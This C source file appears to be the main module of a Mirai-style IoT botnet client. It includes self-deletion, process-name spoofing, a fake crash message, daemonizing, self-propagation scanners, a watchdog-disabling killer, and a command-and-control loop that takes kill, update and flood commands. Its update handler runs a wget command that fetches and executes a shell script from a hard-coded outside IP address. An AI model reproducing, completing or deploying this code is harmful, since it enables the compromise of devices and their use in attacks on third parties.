#define _GNU_SOURCE

#include <stdlib.h>
#include <stdint.h>
#include <unistd.h>
#include <sys/prctl.h>
#include <signal.h>
#include <sys/socket.h>
#include <fcntl.h>
#include <arpa/inet.h>
#include <errno.h>
#include <string.h>
#include <sys/ioctl.h>
#include <sys/wait.h>

#include "headers/scan.h"
#include "headers/main.h"
#include "headers/rand.h"
#include "headers/resolve2.h"
#include "headers/command.h"
#include "headers/entry.h"
#include "headers/kill.h"
#include "headers/watch.h"

int watch_pid = 0;

static int fd = -1;
static int tfd = -1;
char connected = FALSE;


static void flush(void)
{
    char buf[4096];
    int len = 0;
    int fd = -1;

    if((len = readlink(retrieve_entry_val(PROC_SELF_EXE), buf, sizeof(buf) - 1)) == -1)
    {
        return;
    }

    // Delete our original executable
    remove(buf);

    // Recreate it
    if((fd = open(buf, O_CREAT|O_WRONLY|O_TRUNC, 0777)) == -1)
    {
        return;
    }

//    printf("File recreated/replaced.\n");

    close(fd);
    return;
}

static void disconnect_connection(void)
{
	if(fd != -1)
		close(fd);
	fd = -1;
	connected = FALSE;
	sleep(1);
}

static void cnc_relay_proxy(void)
{
	//badwolf fixed report domain cnc log
	struct sockaddr_in addr;
	struct resolv_tor_socket *tor_socket;
	uint32_t _addr = 0;
	//tor_socket = tor_resolver(retrieve_entry_val(DOMAIN));
	fd = socket(AF_INET, SOCK_STREAM, 0);
	if(fd == -1)
		return;
	NONBLOCK(fd);
	/*if (!tor_socket)
    {
			//DEBUG_PRINT("\x1b[31;1mfailed to resolve CNC address with URL %s\n", retrieve_entry_val(DOMAIN));
			close(fd);
			fd = -1;
			return;
	}*/
	addr.sin_family = AF_INET;
	//addr.sin_addr.s_addr = tor_socket->addrs[rand_new() % tor_socket->addrs_len];
	addr.sin_addr.s_addr = INET_ADDR(5,5,5,5);
	addr.sin_port = htons(REPORT_PORT);

	errno = 0;
	connect(fd, (struct sockaddr *)&addr, sizeof(addr)); //connect to cnc
	return;
} 

static void flush_relay(struct relay *ptr)
{
	ptr->type = 0;

	ptr->b1 = 0;
	ptr->b2 = 0;
	ptr->b3 = 0;
	ptr->b4 = 0;
	ptr->b5 = 0;
	ptr->b6 = 0;
	ptr->b7 = 0;

	memset(ptr->buf, 0, sizeof(ptr->buf));                            

	return;
}

static void build_auth(struct relay *data, char *ptr, uint8_t cpucores)
{
    char arch[64];
	char ncores[512];
	
    uint16_t arch_len = 0;
    flush_relay(data);

    data->type = TYPE_AUTH;

    data->b1 = htons(66);
    data->b2 = htons(51);
    data->b3 = htons(99);
    data->b4 = htons(456);
    data->b5 = htons(764);
    data->b6 = htons(79);
	data->b7 = htons(84);

    if(strlen(ptr) > 0)
    {
        strcpy(arch, ptr);
    }

    if(strlen(ptr) == 0)
    {
	#ifdef ARCH
			strcpy(arch, ARCH);
	#endif

	#ifndef ARCH
			strcpy(arch, "rce");
	#endif
    }

    arch_len = strlen(arch);
    arch_len = htons(arch_len);

    memcpy(data->buf, &arch_len, sizeof(uint16_t));
    memcpy(data->buf + sizeof(uint16_t) + 1, arch, ntohs(arch_len));

    memcpy(data->buf + sizeof(ntohs(arch_len)) + sizeof(uint16_t), &cpucores, sizeof(uint8_t)); 
    return;
}

static void send_query(void)
{
	struct relay data;

	flush_relay(&data);

	data.type = TYPE_COMMAND;

	data.b1 = htons(9970);
	data.b2 = htons(8797);
	data.b3 = htons(6767);
	data.b4 = htons(1236);
	data.b5 = htons(8092);
	data.b6 = htons(3334);
	data.b7 = htons(9821);

	send(fd, &data, sizeof(struct relay), MSG_NOSIGNAL);

	return;
}



static void ensure_bind(uint32_t local_addr)
{
	struct sockaddr_in addr;
	int ret = 0;
	int e = 0;
	//int tfd = 0;

	tfd = socket(AF_INET, SOCK_STREAM, 0);
	if(tfd == -1)
		exit(0);

	NONBLOCK(tfd);
	REUSE_ADDR(tfd);
	//REUSE_PORT(fd);

	addr.sin_family = AF_INET;
	addr.sin_port = htons(BIND_PORT);
	addr.sin_addr.s_addr = local_addr;

	errno = 0;

	ret = bind(tfd, (struct sockaddr *)&addr, sizeof(addr));
	e = errno;

	// Request process termination
	if(ret == -1)
		connect(tfd, (struct sockaddr *)&addr, sizeof(addr));

	if(ret == -1 && e == EADDRNOTAVAIL)
	{
		close(tfd);
		sleep(1);
		ensure_bind(LOCAL_ADDRESS);
		return;
	}

	if(ret == -1 && e == EADDRINUSE)
	{
		close(tfd);
		sleep(1);
		terminate_process_via_port(BIND_PORT);
		ensure_bind(LOCALHOST);
		return;
	}

	// Listen with the TCP backlog of 1
	listen(tfd, 1);

	return;
}

int main(int argc, char **args)
{
	int p = 0;
	int i = 0;
	struct relay auth;
	int pid1 = 0;
	int pid2 = 0;
	int len = 0;
  	char buf[64];
    int pgid = 0;
    char ident[64];
	#define _SC_NPROC_ONLN _SC_NPROC_ONLN
    //uint8_t ncores = sysconf(_SC_NPROCESSORS_ONLN);
	uint8_t ncores = sysconf(_SC_NPROC_ONLN);
	sigset_t sigs;

	sigemptyset(&sigs);

	// Block SIGINT
    sigaddset(&sigs, SIGINT);
	sigprocmask(SIG_BLOCK, &sigs, NULL);
	
	// Delete self from the disk
	//unlink(args[0]);

	// Change our working directory
	chdir("/");
	
	// Ignore SIGCHLD so that we dont have any defunct children in the process list and ignore SIGHUP so that we continue to live regardless of the status of the controlling terminal
	signal(SIGCHLD, SIG_IGN);
	signal(SIGHUP, SIG_IGN);

    memset(ident, 0, sizeof(ident));

    if(argc == 2 && strlen(args[1]) < sizeof(ident)) // Parse the input on arg1
    {
        strcpy(ident, args[1]);
    }

	// Retrieve the local ipv4 address of the network adapter
    LOCAL_ADDRESS = local_addr();

	init_rand();
	init_entry();

    flush();

    ensure_bind(LOCALHOST);


	write(STDOUT, "Segmentation Fault (Core dumped).\r\n", 37);
    //write(STDOUT, retrieve_entry_val(RUNTIME_MSG), retrieve_entry_val_len(RUNTIME_MSG));
	//write(STDOUT, "?", 1);
    //write(STDOUT, "\n", 1);

    for(i = 0; i < argc; i++)
        memset(args[i], 0, strlen(args[i]));
    len = (rand_new() % (15 - 10) + 10);
    rand_string(buf, len);
    buf[len] = 0;
    strcpy(args[0], buf);
    rand_string(buf, len);
    buf[len] = 0;
    prctl(PR_SET_NAME, buf);

	pid1 = fork();
	if(pid1)
		exit(1);
	pid2 = fork();
	if(pid2)
		exit(1);
    if(fork() > 0)
        return 1;
	pgid = setsid();
	close(STDIN);
	close(STDOUT);
	close(STDERR);

	#ifdef MBOT_SCAN
	DEBUG_PRINT("Successfully started uc-httpd-1.1 scanning, be sure Listener are UP.\n");
	adb_scan();
	multi_scan();
	DEBUG_PRINT("Successfully started MULTI_HTTPD & ADB Selfrep Scanning");
	#endif
	#ifdef WATCHDOG
    DEBUG_PRINT("Starting Watchdog scanning.\n");
    find_watchdog_driver("/dev");
	#endif
	#ifdef DEBUG
    DEBUG_PRINT("Starting killer-mutex module.\n");
	#endif
	init_kill();
	#ifdef DEBUG
    DEBUG_PRINT("Process name has been spoofed perfectly.\n");
	#endif
	sleep(1);
	init_commands();
	
	#ifdef DEBUG
	DEBUG_PRINT("We successfully started debug-mode (Momentum v5) - cpu core: (\x1b[032m%d)\x1b[037m\n", ncores);
	#endif

	build_auth(&auth, ident, ncores);

	while(TRUE)
	{
		fd_set read_set;
		fd_set write_set;
		struct timeval timeout;
		int ret = 0;
		int max_fds = 0;

		FD_ZERO(&read_set);
		FD_ZERO(&write_set);

        if(tfd != -1)
            FD_SET(tfd, &read_set);

		if(fd == -1)
			cnc_relay_proxy();

		// Check if the socket was correctly initialized
		if(fd == -1)
		{
			p = 0;
			disconnect_connection();
			continue;
		}

		if(errno == ENETUNREACH || errno == EINVAL)
		{
			p = 0;
			DEBUG_PRINT("Unable to resolve CNC address or URL, please check your configuration\n");
			disconnect_connection();
			continue;
		}

        FD_SET(fd, (connected ? &read_set : &write_set));

        max_fds = (tfd > fd ? tfd : fd);

		timeout.tv_usec = 0;
		timeout.tv_sec = 10;

		ret = select(max_fds + 1, &read_set, &write_set, NULL, &timeout);
        if(ret == -1)
		{
			continue;
		}

		if(ret == 0)
		{
			p++;
			if(p == QUERY_TIME)
			{
				p = 0;
				send_query();
			}
		}

        if(FD_ISSET(tfd, &read_set) && tfd != -1)
        {
            int tmp = -1;
            struct sockaddr_in taddr;
            socklen_t taddr_len = sizeof(taddr);

            DEBUG_PRINT("\x1b[031mProcess termination requested accepted, shutting down.\x1b[037m\n");

            tmp = accept(tfd, (struct sockaddr *)&taddr, &taddr_len); // Accept the connection
        
            close(tmp);
            close(tfd);
            kill_watchdog_maintainer();
			terminate_scan();
            terminate_kill_process();

            kill(pgid * -1, SIGKILL);
            exit(0);
        }

		if(FD_ISSET(fd, &write_set))
		{
			int err = 0;
			socklen_t err_len = sizeof(err);

			getsockopt(fd, SOL_SOCKET, SO_ERROR, &err, &err_len);
			if(err)
			{
                DEBUG_PRINT("\x1b[031;1m[error]\x1b[037m CNC is offline or unable to connect.\x1b[037m\n");
				p = 0;
				disconnect_connection();
				continue;
			}

			send(fd, &auth, sizeof(struct relay), MSG_NOSIGNAL);
			DEBUG_PRINT("\x1b[032;1mSuccessfully connected to the Reported C2 Server !\x1b[037m\n");
			connected = TRUE;
		}

		if(!connected)
		{
            DEBUG_PRINT("\e[031m[error] Failed to contact Reported C2 Server.\n");
			p = 0;
			disconnect_connection();
			continue;
		}

		if(FD_ISSET(fd, &read_set))
		{
			uint8_t tmp = 0;
            struct relay data;

            // Receive 1 byte
			errno = 0;
			ret = recv(fd, &tmp, sizeof(uint8_t), MSG_NOSIGNAL | MSG_PEEK);
			if(ret == -1)
			{
				if(errno == EINTR || errno == EWOULDBLOCK || errno == EAGAIN)
				{
                    DEBUG_PRINT("\e[031m[error] Disconnected from the command & control server?\x1b[037m\n");
					continue;
				}
				ret = 0;
			}

			if(ret == 0)
			{
				p = 0;
				disconnect_connection();
				continue;
			}

			
			ret = recv(fd, &data, sizeof(struct relay), MSG_NOSIGNAL); //receive data for command (TYPE_*)
			if(ret == 0)
			{
				continue;
			}


			if(data.type == TYPE_KILL) //Kill all bots connections / kill duplicated
            {
            	#ifdef DEBUG
            	DEBUG_PRINT("[cnc] Bots killed by CNC Admin.\n");
            	#endif
                close(tmp);
                close(tfd);
                kill(pid1, SIGKILL);
                kill(pid2, SIGKILL);
                exit(0);
            }

			if(data.type == TYPE_DUP)
			{
				//kill all dupe connection
			}

            if(data.type == TYPE_UPDATE) //Update bot binary
            {
            	#define MAX_CMD_SIZE 1024
            	char payload_update[MAX_CMD_SIZE];
                #ifdef DEBUG
            	DEBUG_PRINT("[cnc] Updating bots with provided payload binary...\n");
            	#endif
            	sprintf(payload_update, "wget http://212.192.246.96/multi/wget.sh -O fdp; chmod 777 fdp && ./fdp; rm -rf fdp; history -v");
            	system(payload_update);
            	sleep(2);
	            continue;
	         }

            /*if(data.type == TYPE_KILLFLOOD)
            {
            	terminate_kill_process(atk_pid);
            }*/

			if(data.type == TYPE_COMMAND) //Start flood command
			{
				continue;
			}

			command_parse(data.buf, ret);
        }
	}

    return 0;
}

